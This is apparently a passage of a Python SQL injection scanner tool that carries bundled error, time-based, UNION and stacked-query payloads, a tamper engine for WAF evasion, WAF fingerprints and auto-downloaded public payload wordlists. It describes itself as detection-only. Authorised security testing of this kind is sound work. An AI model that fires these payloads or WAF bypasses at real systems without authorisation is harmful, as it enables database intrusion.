#!/usr/bin/env python3
"""
sql_map.py — Nation-Grade SQL Injection Scanner (v3.0.0)
Oxysintx Framework

Architecture
    sql_map.py
    ├── Metadata + constants
    ├── Wordlist Manager       (auto-sync: SQLMap, PayloadsAllTheThings, SecLists)
    ├── Tamper Engine          (16 encoding/obfuscation strategies)
    ├── Payload Registry       (bundled + on-disk wordlists + tamper variants)
    ├── Response Normalizer    (volatile-token stripping + similarity)
    ├── HTTP Transport         (multi-vector, session reuse, token bucket, retry)
    ├── Baseline Engine        (multi-sample stability)
    ├── Detection Engines      (error / boolean / time / union / stacked)
    ├── WAF Detector           (10 signatures + adaptive bypass)
    ├── DBMS Fingerprinter     (version + variant discovery)
    ├── Confidence & Validator (weighted scoring + status classification)
    ├── Scanner                (adaptive pipeline + cancel + budget)
    ├── Streaming API          (SSE-friendly events)
    ├── Integration Adapters   (run / run_sql_injection_scan)
    └── CLI

Techniques
    • error-based     — categorized DB signatures with weighted matching
    • boolean-based   — multi-signal comparison + normalized similarity
    • time-based      — statistical timing analysis (repeated measurement)
    • union-based     — safe structural detection (no data dumping)
    • stacked-queries — multi-statement detection (expert only)

Safety
    • Never extracts data — only confirms vulnerability presence.
    • Bounded by request budget + wall-clock cap.
    • Redacts Authorization/Cookie headers from logs.

Author: Yanxzyx
"""

from __future__ import annotations

import argparse
import hashlib
import json
import logging
import os
import random
import re
import string
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, Iterator, List, Optional, Tuple, Union
from urllib.parse import urlparse, parse_qs, urlencode, quote

import requests
from bs4 import BeautifulSoup
from requests.exceptions import RequestException

try:
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    HTTPAdapter = None
    Retry = None


# ═══════════════════════════════════════════════════════════════════════════
# METADATA
# ═══════════════════════════════════════════════════════════════════════════
__version__ = "3.0.0"
__author__ = "Yanxzyx"
__framework__ = "Oxysintx"

logger = logging.getLogger("oxysintx.sqli")
logger.propagate = False
if not logger.handlers:
    _h = logging.StreamHandler()
    _h.setFormatter(logging.Formatter(
        "%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    ))
    logger.addHandler(_h)
logger.setLevel(logging.INFO)

TOOL_INFO = {
    "name": "SQLMap (SQL Injection)",
    "version": __version__,
    "description": (
        "Multi-technique SQL injection scanner with wordlist-based payloads, "
        "tamper engine, WAF adaptive bypass, DBMS fingerprinting, and multi-"
        "vector testing (query/body/header/cookie/JSON). Safe by design — "
        "never dumps data."
    ),
    "category": "Web Vulnerability",
    "author": __author__,
}
TOOL_KIND = "scanner"


# ═══════════════════════════════════════════════════════════════════════════
# PATHS & TUNABLES
# ═══════════════════════════════════════════════════════════════════════════
_PROJECT_ROOT = Path(__file__).resolve().parent.parent
WORDLIST_DIR  = _PROJECT_ROOT / "wordlist" / "sqli"

DEFAULT_TIMEOUT              = 5.0
DEFAULT_MAX_THREADS          = 10
DEFAULT_MAX_REQUESTS         = 300
DEFAULT_RATE_LIMIT           = 25.0
DEFAULT_MAX_DURATION         = 120.0
DEFAULT_MAX_RESPONSE_SIZE    = 5 * 1024 * 1024
DEFAULT_RETRIES              = 2
DEFAULT_RETRY_DELAY          = 1.0
DEFAULT_BOOLEAN_THRESHOLD    = 0.85
DEFAULT_TIME_TRIGGER         = 2.0
DEFAULT_BASELINE_SAMPLES     = 3
DEFAULT_CONFIDENCE_THRESHOLD = 0.45
DOWNLOAD_TIMEOUT             = 25.0
DOWNLOAD_RETRIES             = 3
DOWNLOAD_BACKOFF             = 1.5
MIN_WORDLIST_LINES           = 4
MAX_TAMPER_VARIANTS          = 3

# Sensitive headers (redacted from logs / output)
SENSITIVE_HEADERS = {
    "authorization", "cookie", "set-cookie", "proxy-authorization",
    "x-api-key", "x-auth-token", "x-csrf-token", "x-session-id",
}

# Volatile-token patterns
DYNAMIC_TOKEN_PATTERNS = [
    re.compile(r'name=["\']csrf[^"\']*["\'][^>]*value=["\'][^"\']*["\']', re.I),
    re.compile(r'name=["\']_token["\'][^>]*value=["\'][^"\']*["\']', re.I),
    re.compile(r'name=["\']__RequestVerificationToken["\'][^>]*value=["\'][^"\']*["\']', re.I),
    re.compile(r'\b(?:nonce|token|csrf|request_id|timestamp|time|random|uid|uuid)["\']?\s*[:=]\s*["\'][0-9a-fA-F\-]{4,}["\']', re.I),
    re.compile(r'\b\d{10,13}\b'),
]

# WAF signatures
_WAF_SIGNATURES: Dict[str, List[str]] = {
    "Cloudflare":  ["cloudflare", "cf-ray", "__cfduid", "cf-cache-status"],
    "AWS WAF":     ["awselb", "x-amz-cf-id", "x-amzn-requestid"],
    "ModSecurity": ["mod_security", "modsecurity"],
    "Sucuri":      ["sucuri", "x-sucuri-id"],
    "Incapsula":   ["incap_ses", "visid_incap", "incapsula"],
    "F5 BIG-IP":   ["bigipserver", "tscookie", "f5-"],
    "Wordfence":   ["wordfence"],
    "Barracuda":   ["barra_counter_session", "barracuda"],
    "Akamai":      ["akamai", "ak_bmsc", "x-akamai"],
    "Imperva":     ["imperva", "x-iinfo"],
}

_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]


# ═══════════════════════════════════════════════════════════════════════════
# WORDLIST SOURCES — auto-synced from public GitHub
# ═══════════════════════════════════════════════════════════════════════════
SQLI_WORDLIST_SOURCES: Dict[str, Dict[str, Any]] = {
    "payloadsallthethings_sqli.txt": {
        "urls": [
            "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/SQL-Injection",
            "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Auth_Bypass.txt",
            "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Generic_Fuzz.txt",
        ],
        "source": "swisskyrepo/PayloadsAllTheThings",
        "license": "MIT",
        "min_lines": 20,
        "optional": False,
    },
    "seclists_sqli_generic.txt": {
        "urls": [
            "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/Generic-SQLi.txt",
        ],
        "source": "danielmiessler/SecLists",
        "license": "MIT",
        "min_lines": 10,
        "optional": False,
    },
    "seclists_sqli_enum.txt": {
        "urls": [
            "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/SQLiPolyglot.txt",
            "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/quick-SQLi.txt",
        ],
        "source": "danielmiessler/SecLists",
        "license": "MIT",
        "min_lines": 5,
        "optional": True,
    },
    "fuzzdb_sqli.txt": {
        "urls": [
            "https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/sql-injection/detect/Generic_blind.txt",
            "https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/sql-injection/detect/MySQL.txt",
            "https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/sql-injection/detect/MSSQL.txt",
            "https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/sql-injection/detect/PostgreSQL.txt",
            "https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/sql-injection/detect/Oracle.txt",
        ],
        "source": "fuzzdb-project/fuzzdb",
        "license": "CC-BY-3.0",
        "min_lines": 10,
        "optional": True,
    },
    "sqlmapproject_sqli.txt": {
        "urls": [
            "https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/data/xml/payloads/boolean_blind.xml",
            "https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/data/xml/payloads/error_based.xml",
            "https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/data/xml/payloads/time_blind.xml",
        ],
        "source": "sqlmapproject/sqlmap",
        "license": "GPL-2.0",
        "min_lines": 5,
        "optional": True,
    },
}


# ═══════════════════════════════════════════════════════════════════════════
# UTILITY HELPERS
# ═══════════════════════════════════════════════════════════════════════════
def redact_sensitive_headers(headers: Dict[str, str]) -> Dict[str, str]:
    if not headers:
        return headers
    return {k: ("[REDACTED]" if k.lower() in SENSITIVE_HEADERS else v)
            for k, v in headers.items()}


def sanitize_payload_for_log(payload: str, max_len: int = 60) -> str:
    if not payload:
        return ""
    return payload if len(payload) <= max_len else payload[:max_len] + "..."


def _normalize_url(target: str) -> str:
    t = (target or "").strip()
    if not t:
        raise ValueError("target is required")
    if not t.lower().startswith(("http://", "https://")):
        t = "http://" + t
    return t


def _detect_waf(headers: Dict[str, str], body: str) -> Optional[str]:
    hay = (" ".join(f"{k}: {v}" for k, v in headers.items())
           + " " + (body or "")[:4000]).lower()
    for name, sigs in _WAF_SIGNATURES.items():
        if any(sig.lower() in hay for sig in sigs):
            return name
    return None


def _looks_like_html(raw: bytes) -> bool:
    return raw[:512].lstrip().lower().startswith(
        (b"<!doctype html", b"<html", b"<?xml")
    )


def _atomic_write(target: Path, content: str) -> None:
    tmp = target.with_suffix(target.suffix + ".tmp")
    with open(tmp, "w", encoding="utf-8", newline="\n") as f:
        f.write(content)
        f.flush()
        try:
            os.fsync(f.fileno())
        except OSError:
            pass
    os.replace(tmp, target)


# ═══════════════════════════════════════════════════════════════════════════
# WORDLIST MANAGER
# ═══════════════════════════════════════════════════════════════════════════
_wordlist_lock = threading.RLock()
_wordlist_cache: Dict[str, List[str]] = {}


def _ensure_wordlist_dir() -> None:
    WORDLIST_DIR.mkdir(parents=True, exist_ok=True)


def _download_raw(url: str, name: str, retries: int, backoff: float,
                  timeout: float, optional: bool = False) -> Optional[bytes]:
    log_level  = logging.DEBUG if optional else logging.INFO
    warn_level = logging.DEBUG if optional else logging.WARNING
    last_err: Optional[Exception] = None

    for attempt in range(retries + 1):
        try:
            logger.log(log_level, "[sqli] fetching %s (attempt %d/%d)",
                       name, attempt + 1, retries + 1)
            r = requests.get(url, timeout=timeout,
                             headers={"User-Agent": random.choice(_UA_POOL)})
            if r.status_code != 200:
                raise RuntimeError(f"HTTP {r.status_code}")
            raw = r.content
            if not raw or len(raw) < 32:
                raise RuntimeError("empty response")
            if _looks_like_html(raw):
                raise RuntimeError("HTML page returned, not a wordlist")
            return raw
        except Exception as exc:
            last_err = exc
            if attempt < retries:
                time.sleep(backoff * (2 ** attempt))

    logger.log(warn_level, "[sqli] %s failed: %s", name, last_err)
    return None


def _parse_payload_line(line: str) -> Optional[str]:
    s = line.strip()
    if not s or s.startswith(("#", "//", ";")):
        return None
    # XML payload files (sqlmap) — extract <payload>...</payload>
    m = re.search(r"<payload>\s*(.*?)\s*</payload>", s, re.I | re.S)
    if m:
        s = m.group(1)
    if not s or len(s) > 512:
        return None
    return s


def _load_wordlist_file(path: Path, min_lines: int) -> List[str]:
    try:
        text = path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return []
    out: List[str] = []
    seen: set = set()
    for raw in text.splitlines():
        p = _parse_payload_line(raw)
        if p and p not in seen:
            seen.add(p)
            out.append(p)
    if len(out) < min_lines:
        return []
    return out


def load_sqli_wordlist(force_download: bool = False,
                       auto_sync: bool = True) -> List[str]:
    """Merge all wordlist sources into a single deduplicated list."""
    global _wordlist_cache
    with _wordlist_lock:
        if _wordlist_cache.get("__all__") is not None and not force_download:
            return list(_wordlist_cache["__all__"])

        _ensure_wordlist_dir()
        all_payloads: List[str] = []

        for name, meta in SQLI_WORDLIST_SOURCES.items():
            path = WORDLIST_DIR / name
            optional = bool(meta.get("optional", False))

            need_download = force_download or not path.exists()
            if not need_download:
                try:
                    if path.stat().st_size < 128:
                        need_download = True
                except OSError:
                    need_download = True

            if need_download and auto_sync:
                got = False
                for url in meta.get("urls", []):
                    raw = _download_raw(
                        url, f"{name} ({meta['source']})",
                        DOWNLOAD_RETRIES, DOWNLOAD_BACKOFF, DOWNLOAD_TIMEOUT,
                        optional=optional,
                    )
                    if raw is not None:
                        try:
                            content = raw.decode("utf-8", errors="replace")
                            # Preserve accumulated content if multiple URLs
                            if path.exists() and not force_download:
                                try:
                                    existing = path.read_text(encoding="utf-8",
                                                              errors="replace")
                                    content = existing + "\n" + content
                                except OSError:
                                    pass
                            _atomic_write(path, content)
                            got = True
                        except OSError:
                            continue

            payloads = _load_wordlist_file(path, meta.get("min_lines", 5)) \
                if path.exists() else []
            if payloads:
                logger.debug("[sqli] %s → %d payloads", name, len(payloads))
                all_payloads.extend(payloads)

        # Deduplicate
        seen: set = set()
        deduped: List[str] = []
        for p in all_payloads:
            if p and p not in seen:
                seen.add(p)
                deduped.append(p)

        _wordlist_cache["__all__"] = deduped
        logger.info("[sqli] loaded %d unique payload(s) from %d source(s)",
                    len(deduped), len(SQLI_WORDLIST_SOURCES))
        return list(deduped)


def load_wordlist(name: Optional[str], bundled: List[str],
                  max_lines: int = 60) -> List[str]:
    """Legacy wordlist loader — path-safe, falls back to bundled."""
    if not name:
        return bundled[:max_lines]

    with _wordlist_lock:
        if name in _wordlist_cache:
            return _wordlist_cache[name][:max_lines]

        target = (WORDLIST_DIR / Path(name).name).resolve()
        try:
            target.relative_to(WORDLIST_DIR.resolve())
        except ValueError:
            return bundled[:max_lines]

        if target.exists() and target.stat().st_size > 0:
            lines = _load_wordlist_file(target, MIN_WORDLIST_LINES)
            if lines:
                _wordlist_cache[name] = lines
                return lines[:max_lines]

        return bundled[:max_lines]


def ensure_wordlists(force: bool = False) -> Dict[str, Any]:
    """Return metadata about XSS wordlist sources + load the full list."""
    _ensure_wordlist_dir()
    out: Dict[str, Any] = {
        "directory": str(WORDLIST_DIR),
        "sources": {
            k: {"source": v["source"], "license": v.get("license", ""),
                "optional": bool(v.get("optional", False))}
            for k, v in SQLI_WORDLIST_SOURCES.items()
        },
        "files": [],
        "version": __version__,
    }
    for name, meta in SQLI_WORDLIST_SOURCES.items():
        path = WORDLIST_DIR / name
        payloads = _load_wordlist_file(path, meta.get("min_lines", 5)) \
            if path.exists() else []
        out["files"].append({
            "name":     name,
            "source":   meta["source"],
            "license":  meta.get("license", ""),
            "optional": bool(meta.get("optional", False)),
            "exists":   path.exists(),
            "size":     path.stat().st_size if path.exists() else 0,
            "payloads": len(payloads),
        })
    if force:
        merged = load_sqli_wordlist(force_download=True, auto_sync=True)
        out["merged_count"] = len(merged)
    return out


# ═══════════════════════════════════════════════════════════════════════════
# TAMPER ENGINE
# ═══════════════════════════════════════════════════════════════════════════
class TamperEngine:
    """
    Encoding / obfuscation strategies for WAF evasion.

    Each function takes a payload string and returns a mutated variant.
    Useful when a WAF blocks the raw payload but the underlying SQL
    engine would still execute a transformed version.
    """

    @staticmethod
    def space_to_comment(p: str) -> str:
        return re.sub(r"\s+", "/**/", p)

    @staticmethod
    def space_to_plus(p: str) -> str:
        return p.replace(" ", "+")

    @staticmethod
    def space_to_tab(p: str) -> str:
        return p.replace(" ", "\t")

    @staticmethod
    def space_to_newline(p: str) -> str:
        return p.replace(" ", "\n")

    @staticmethod
    def case_randomize(p: str) -> str:
        return "".join(c.upper() if random.getrandbits(1) else c.lower()
                       for c in p)

    @staticmethod
    def keyword_case(p: str) -> str:
        """Mixed case for SQL keywords only (SELECT, UNION, etc.)."""
        def repl(m: re.Match) -> str:
            return "".join(c.upper() if i % 2 == 0 else c.lower()
                           for i, c in enumerate(m.group(0)))
        return re.sub(
            r"\b(SELECT|UNION|FROM|WHERE|AND|OR|ORDER|BY|GROUP|HAVING|"
            r"INSERT|UPDATE|DELETE|DROP|SLEEP|WAITFOR|DELAY|EXEC)\b",
            repl, p, flags=re.IGNORECASE,
        )

    @staticmethod
    def quote_to_double_quote(p: str) -> str:
        return p.replace("'", '"')

    @staticmethod
    def hex_encode_strings(p: str) -> str:
        """Encode SQL string literals as hex (MySQL)."""
        def repl(m: re.Match) -> str:
            s = m.group(1)
            return "0x" + s.encode().hex()
        return re.sub(r"'([^']{1,20})'", repl, p)

    @staticmethod
    def url_encode(p: str) -> str:
        return quote(p, safe="")

    @staticmethod
    def double_url_encode(p: str) -> str:
        return quote(quote(p, safe=""), safe="")

    @staticmethod
    def unicode_escape(p: str) -> str:
        return "".join(f"\\u{ord(c):04x}" if ord(c) < 128 else c for c in p)

    @staticmethod
    def concat_split(p: str) -> str:
        """Split SQL keywords with %00 (null byte) injection."""
        return p.replace(" ", "%00")

    @staticmethod
    def whitespace_pad(p: str) -> str:
        return p.replace(" ", " %09 ")

    @staticmethod
    def c_comment(p: str) -> str:
        return f"/*!{p}*/"

    @staticmethod
    def equivalent_op(p: str) -> str:
        """Substitute = with LIKE, < > with BETWEEN, etc."""
        return (p.replace("=", " LIKE ")
                 .replace("<>", " BETWEEN ")
                 .replace("!=", " NOT LIKE "))

    @classmethod
    def mutate(cls, payload: str, max_variants: int = MAX_TAMPER_VARIANTS
               ) -> List[str]:
        """Return a compact set of high-value tampered variants."""
        variants = [
            cls.space_to_comment(payload),
            cls.case_randomize(payload),
            cls.keyword_case(payload),
            cls.c_comment(payload),
            cls.space_to_newline(payload),
            cls.hex_encode_strings(payload),
            cls.equivalent_op(payload),
            cls.double_url_encode(payload),
        ]
        seen = {payload}
        out: List[str] = []
        for v in variants:
            if v and v != payload and v not in seen:
                seen.add(v)
                out.append(v)
        return out[:max_variants]


# ═══════════════════════════════════════════════════════════════════════════
# BUNDLED PAYLOAD REGISTRY (fallback + boolean pairs)
# ═══════════════════════════════════════════════════════════════════════════
@dataclass(frozen=True)
class Payload:
    value: str
    technique: str
    database: Optional[str] = None
    risk: str = "low"
    expected_behavior: str = ""


_BUNDLED_ERROR = [
    "'", "\"", "'--", "\"--", "'#", "')", "')--", "';", "');",
    "' OR '1'='1", "' AND '1'='2", "') OR ('1'='1",
    "1' AND extractvalue(1,concat(0x7e,version()))--",
    "1' AND updatexml(1,concat(0x7e,version()),1)--",
    "1 AND 1=convert(int,@@version)--",
    "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
    "1' ORDER BY 1--", "1' ORDER BY 10--", "1' ORDER BY 100--",
    "\\'", "\\\"", "' OR 1=1--", "\" OR 1=1--",
    "'||'", "'||1--", "1'||1--",
]

_BUNDLED_TIME = [
    "' AND SLEEP(3)--", "' AND SLEEP(3)#", "\" AND SLEEP(3)--",
    "1' AND SLEEP(3)--", "1 AND SLEEP(3)--",
    "'; SELECT pg_sleep(3)--", "' AND 1=(SELECT 1 FROM PG_SLEEP(3))--",
    "'; WAITFOR DELAY '0:0:3'--", "' WAITFOR DELAY '0:0:3'--",
    "1; WAITFOR DELAY '0:0:3'--",
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
    "' AND randomblob(100000000)--", "' AND 1=1 AND SLEEP(3)--",
]

_BUNDLED_UNION = [
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--", "' UNION ALL SELECT NULL--",
    "' UNION SELECT 1,2,3--", "' UNION ALL SELECT 1,2,3--",
    "-1 UNION SELECT NULL--", "' UNION SELECT @@version--",
]

_BUNDLED_STACKED = [
    "'; SELECT 1--", "'; SELECT pg_sleep(0)--", "'; EXEC sp_help--",
    "1; SELECT 1--", "1'; SELECT 1--",
]


class PayloadRegistry:
    """Payloads — bundled + wordlist + tamper variants."""

    BOOLEAN_TRUE = [
        Payload("' AND '1'='1", "boolean", None, "medium", "boolean true"),
        Payload("' AND 1=1--", "boolean", None, "medium", "boolean true"),
        Payload("1 AND 1=1", "boolean", None, "medium", "boolean true"),
        Payload("1' AND 1=1--", "boolean", None, "medium", "boolean true"),
        Payload("' AND 'a'='a", "boolean", None, "medium", "string boolean true"),
    ]
    BOOLEAN_FALSE = [
        Payload("' AND '1'='2", "boolean", None, "medium", "boolean false"),
        Payload("' AND 1=2--", "boolean", None, "medium", "boolean false"),
        Payload("1 AND 1=2", "boolean", None, "medium", "boolean false"),
        Payload("1' AND 1=2--", "boolean", None, "medium", "boolean false"),
        Payload("' AND 'a'='b", "boolean", None, "medium", "string boolean false"),
    ]

    _disk_cache: Dict[str, List[Payload]] = {}
    _cache_lock = threading.RLock()

    @classmethod
    def _from_wordlist(cls, technique: str,
                       filter_fn: Optional[Callable[[str], bool]] = None,
                       max_count: int = 200) -> List[Payload]:
        with cls._cache_lock:
            if technique in cls._disk_cache:
                return cls._disk_cache[technique][:max_count]

            try:
                merged = load_sqli_wordlist(auto_sync=True)
            except Exception:
                merged = []

            out: List[Payload] = []
            for p in merged:
                if filter_fn and not filter_fn(p):
                    continue
                out.append(Payload(p, technique, None, "low", ""))
                if len(out) >= max_count:
                    break

            cls._disk_cache[technique] = out
            return out[:max_count]

    @classmethod
    def get_error_payloads(cls, max_count: int = 80) -> List[Payload]:
        disk = cls._from_wordlist("error", max_count=max_count)
        if disk:
            return disk
        return [Payload(p, "error", None, "low", "") for p in _BUNDLED_ERROR]

    @classmethod
    def get_boolean_payloads(cls) -> Tuple[List[Payload], List[Payload]]:
        return cls.BOOLEAN_TRUE.copy(), cls.BOOLEAN_FALSE.copy()

    @classmethod
    def get_time_payloads(cls, max_count: int = 40) -> List[Payload]:
        def is_time(p: str) -> bool:
            pl = p.lower()
            return any(k in pl for k in
                       ("sleep", "waitfor", "pg_sleep", "delay",
                        "dbms_pipe", "benchmark", "randomblob"))
        disk = cls._from_wordlist("time", filter_fn=is_time, max_count=max_count)
        if disk:
            return disk
        return [Payload(p, "time", None, "low", "") for p in _BUNDLED_TIME]

    @classmethod
    def get_union_payloads(cls, max_count: int = 40) -> List[Payload]:
        def is_union(p: str) -> bool:
            return "union" in p.lower() and "select" in p.lower()
        disk = cls._from_wordlist("union", filter_fn=is_union, max_count=max_count)
        if disk:
            return disk
        return [Payload(p, "union", None, "low", "") for p in _BUNDLED_UNION]

    @classmethod
    def get_stacked_payloads(cls, max_count: int = 20) -> List[Payload]:
        disk = cls._from_wordlist("stacked", max_count=max_count)
        if disk:
            return disk
        return [Payload(p, "stacked", None, "high", "") for p in _BUNDLED_STACKED]

    @classmethod
    def expand_with_tamper(cls, payloads: List[Payload],
                           max_variants: int = MAX_TAMPER_VARIANTS) -> List[Payload]:
        out: List[Payload] = list(payloads)
        seen = {p.value for p in payloads}
        for p in payloads:
            for variant in TamperEngine.mutate(p.value, max_variants):
                if variant not in seen:
                    seen.add(variant)
                    out.append(Payload(
                        variant, p.technique + "-tampered",
                        p.database, p.risk, p.expected_behavior,
                    ))
        return out


# ═══════════════════════════════════════════════════════════════════════════
# RESPONSE NORMALIZER
# ═══════════════════════════════════════════════════════════════════════════
class ResponseNormalizer:
    @staticmethod
    def normalize(html: str) -> str:
        if not html:
            return ""
        text = html
        text = re.sub(r"<script[^>]*>.*?</script>", "", text, flags=re.I | re.S)
        text = re.sub(r"<style[^>]*>.*?</style>",   "", text, flags=re.I | re.S)
        for pattern in DYNAMIC_TOKEN_PATTERNS:
            text = pattern.sub("", text)
        text = re.sub(r"\s+", " ", text).strip()
        return text

    @staticmethod
    def hash_normalized(text: str) -> str:
        return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()

    @staticmethod
    def similarity(a: str, b: str) -> float:
        if a == b: return 1.0
        if not a or not b: return 0.0
        def bigrams(s: str) -> set:
            s = s.lower()
            return {s[i:i+2] for i in range(max(len(s) - 1, 0))} if len(s) > 1 else {s}
        g1, g2 = bigrams(a), bigrams(b)
        if not g1 or not g2: return 0.0
        inter = len(g1 & g2); union = len(g1 | g2)
        return inter / union if union else 1.0


# ═══════════════════════════════════════════════════════════════════════════
# TOKEN BUCKET
# ═══════════════════════════════════════════════════════════════════════════
class _TokenBucket:
    def __init__(self, rate: float, burst: int = 4):
        self.rate    = max(0.1, float(rate))
        self.burst   = max(1, int(burst))
        self._tokens = float(self.burst)
        self._last   = time.monotonic()
        self._lock   = threading.Lock()

    def acquire(self, timeout: float = 20.0) -> bool:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            with self._lock:
                now = time.monotonic()
                self._tokens = min(self.burst,
                                   self._tokens + (now - self._last) * self.rate)
                self._last = now
                if self._tokens >= 1.0:
                    self._tokens -= 1.0
                    return True
                wait = (1.0 - self._tokens) / self.rate
            time.sleep(min(wait, 0.2))
        return False


# ═══════════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════════
@dataclass
class ScanConfig:
    timeout: float = DEFAULT_TIMEOUT
    max_threads: int = DEFAULT_MAX_THREADS
    verify_ssl: bool = True
    follow_redirects: bool = False
    max_requests: int = DEFAULT_MAX_REQUESTS
    request_delay: float = 0.0
    rate_limit: float = DEFAULT_RATE_LIMIT
    max_duration: float = DEFAULT_MAX_DURATION
    max_response_size: int = DEFAULT_MAX_RESPONSE_SIZE
    retries: int = DEFAULT_RETRIES
    retry_delay: float = DEFAULT_RETRY_DELAY
    baseline_samples: int = DEFAULT_BASELINE_SAMPLES
    boolean_similarity_threshold: float = DEFAULT_BOOLEAN_THRESHOLD
    time_trigger: float = DEFAULT_TIME_TRIGGER
    confidence_threshold: float = DEFAULT_CONFIDENCE_THRESHOLD
    continue_after_detection: bool = True
    test_error: bool = True
    test_boolean: bool = True
    test_time: bool = True
    test_union: bool = True
    test_stacked: bool = False
    enable_tamper: bool = True
    max_wordlist_payloads: int = 80
    stop_event: Optional[threading.Event] = None
    progress_cb: Optional[Callable[[int, int, str], None]] = None

    def validate(self) -> None:
        if self.timeout <= 0: raise ValueError("timeout must be > 0")
        if self.max_threads < 1: raise ValueError("max_threads must be >= 1")
        if self.max_requests < 1: raise ValueError("max_requests must be >= 1")
        if self.max_duration <= 0: raise ValueError("max_duration must be > 0")
        if self.max_response_size < 1024: raise ValueError("max_response_size must be >= 1024")
        if self.retries < 0: raise ValueError("retries must be >= 0")
        if self.baseline_samples < 1: raise ValueError("baseline_samples must be >= 1")
        if not (0 <= self.boolean_similarity_threshold <= 1):
            raise ValueError("boolean_similarity_threshold must be between 0 and 1")
        if not (0 <= self.confidence_threshold <= 1):
            raise ValueError("confidence_threshold must be between 0 and 1")


# ═══════════════════════════════════════════════════════════════════════════
# MODELS
# ═══════════════════════════════════════════════════════════════════════════
@dataclass
class BaselineSignature:
    status_code: int = 0
    response_length: int = 0
    content_type: str = ""
    title: str = ""
    normalized_body_hash: str = ""
    normalized_body_preview: str = ""
    timestamp: float = 0.0


@dataclass
class TimingSample:
    values: List[float] = field(default_factory=list)
    def mean(self) -> float:
        return sum(self.values) / len(self.values) if self.values else 0.0
    def std_dev(self) -> float:
        if len(self.values) < 2:
            return 0.0
        m = self.mean()
        variance = sum((v - m) ** 2 for v in self.values) / (len(self.values) - 1)
        return variance ** 0.5


@dataclass
class ScanFinding:
    parameter: str
    technique: str
    confidence: float
    severity: str
    status: str
    parameter_in: str = "query"
    database_type: Optional[str] = None
    db_version: Optional[str] = None
    evidence: Dict[str, Any] = field(default_factory=dict)
    matched_error: Optional[str] = None
    payload: str = ""
    tamper: Optional[str] = None
    response_status: Optional[int] = None
    baseline_length: Optional[int] = None
    response_length: Optional[int] = None
    similarity: Optional[float] = None

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class ScanResult:
    url: str = ""
    method: str = "GET"
    parameters_tested: List[str] = field(default_factory=list)
    payloads_tested: int = 0
    findings: List[ScanFinding] = field(default_factory=list)
    vulnerable: bool = False
    status: str = "unknown"
    scan_id: str = ""
    started_at: str = ""
    completed_at: str = ""
    duration: float = 0.0
    requests_sent: int = 0
    errors: int = 0
    warnings: List[str] = field(default_factory=list)
    techniques_tested: List[str] = field(default_factory=list)
    database_hint: Optional[str] = None
    db_version: Optional[str] = None
    waf_detected: Optional[str] = None
    waf_bypass_used: bool = False
    wordlist_size: int = 0
    tampered_payloads: int = 0
    cancelled: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "method": self.method,
            "parameters_tested": self.parameters_tested,
            "payloads_tested": self.payloads_tested,
            "findings": [f.to_dict() for f in self.findings],
            "vulnerable": self.vulnerable,
            "status": self.status,
            "scan_id": self.scan_id,
            "started_at": self.started_at,
            "completed_at": self.completed_at,
            "duration": self.duration,
            "requests_sent": self.requests_sent,
            "errors": self.errors,
            "warnings": self.warnings,
            "techniques_tested": self.techniques_tested,
            "database_hint": self.database_hint,
            "db_version": self.db_version,
            "waf_detected": self.waf_detected,
            "waf_bypass_used": self.waf_bypass_used,
            "wordlist_size": self.wordlist_size,
            "tampered_payloads": self.tampered_payloads,
            "cancelled": self.cancelled,
            "scan_type": "sqli",
            "version": __version__,
        }


# ═══════════════════════════════════════════════════════════════════════════
# HTTP TRANSPORT (multi-vector)
# ═══════════════════════════════════════════════════════════════════════════
class HTTPClient:
    def __init__(self, config: ScanConfig,
                 headers: Optional[Dict[str, str]] = None,
                 cookies: Optional[Dict[str, str]] = None,
                 proxies: Optional[Dict[str, str]] = None):
        self.config = config
        self.headers = headers or {"User-Agent": f"Oxysintx-SQLi/{__version__}"}
        self.cookies = cookies
        self.proxies = proxies
        self._session: Optional[requests.Session] = None
        self._last_request_time = 0.0
        self._request_count = 0
        self._lock = threading.Lock()
        self._bucket = (
            _TokenBucket(config.rate_limit, burst=4)
            if config.rate_limit and config.rate_limit > 0 else None
        )
        self._started_mono = time.monotonic()

    def _get_session(self) -> requests.Session:
        with self._lock:
            if self._session is None:
                s = requests.Session()
                s.headers.update(self.headers)
                if self.cookies:  s.cookies.update(self.cookies)
